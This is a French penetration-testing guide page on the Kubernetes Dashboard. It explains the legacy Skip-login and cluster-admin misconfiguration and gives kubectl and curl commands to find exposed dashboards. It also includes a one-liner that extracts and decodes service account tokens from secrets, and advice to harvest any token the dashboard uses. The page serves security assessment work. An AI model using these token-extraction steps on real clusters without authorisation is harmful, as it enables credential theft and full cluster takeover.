---
title: "Dashboard : contrôle du cluster via l'interface web et son compte de service"
order: 3
description: "Le Kubernetes Dashboard agit avec son propre compte de service. Les déploiements plus anciens liaient ce compte à cluster-admin et permettaient de passer l'écran de connexion, si bien qu'un dashboard accessible donnait le contrôle total du cluster depuis le navigateur. Même les déploiements actuels constituent une cible lorsqu'ils sont exposés, car le compte de service du dashboard et tout jeton qui y est saisi pilotent l'API server."
keywords:
  - kubernetes dashboard
  - kubernetes-dashboard
  - skip login
  - service account
  - cluster-admin
---

# Dashboard

Le Kubernetes Dashboard est une interface web qui dialogue avec l'API server à l'aide d'un compte de service. Son danger est historique et lié à la configuration : les premiers déploiements liaient le compte de service `kubernetes-dashboard` à `cluster-admin` et autorisaient un bouton Skip sur l'écran de connexion, si bien que quiconque atteignait le dashboard opérait en tant qu'administrateur du cluster sans aucune authentification. Les versions actuelles exigent un jeton et sont livrées avec des droits minimaux, mais un dashboard accessible reste une cible, car quel que soit le jeton qu'un utilisateur y colle, ou le compte de service sous lequel il tourne, cela devient l'accès de l'attaquant dès lors que l'interface est exposée.

Le trouver et l'évaluer :

```bash
# the dashboard is a service, often exposed via NodePort or an ingress
curl -sk https://<node>:<nodeport>/ | grep -i dashboard
kubectl get svc -A | grep -i dashboard
# what can the dashboard's own service account do?
kubectl auth can-i --list --as=system:serviceaccount:kubernetes-dashboard:kubernetes-dashboard
```

## Voies d'exploitation

```bash
# legacy: a Skip-login dashboard bound to cluster-admin => full control in-browser
#   open the dashboard URL, click Skip, operate as cluster-admin.
# modern: steal or reuse a token that has dashboard access, or read the
#   dashboard SA token if its RBAC is broad
kubectl -n kubernetes-dashboard get secret -o json | \
  python3 -c 'import sys,json,base64;[print(base64.b64decode(s["data"].get("token","")).decode()[:60]) for s in json.load(sys.stdin)["items"] if "token" in s.get("data",{})]'
```

## Notes d'exploitation

- Le premier contrôle porte sur les permissions du compte de service du dashboard ; s'il est lié à `cluster-admin` (la valeur par défaut historique de certaines installations), lire ou utiliser son jeton donne immédiatement le contrôle total.
- Une option Skip sur un dashboard exposé est un gain instantané ; elle vous dépose dans l'interface en tant que compte de service du dashboard.
- Lorsqu'il est exposé via NodePort ou un ingress sans authentification en amont, le dashboard est accessible depuis l'extérieur du cluster ; traitez un dashboard exposé comme une surface de manipulation d'identifiants et récoltez tout jeton qu'il utilise.

## Références

- [Kubernetes Dashboard : contrôle d'accès](https://github.com/kubernetes/dashboard/blob/master/docs/user/access-control/README.md)
- [HackTricks : Kubernetes dashboard](https://book.hacktricks.xyz/pentesting-cloud/kubernetes-security)
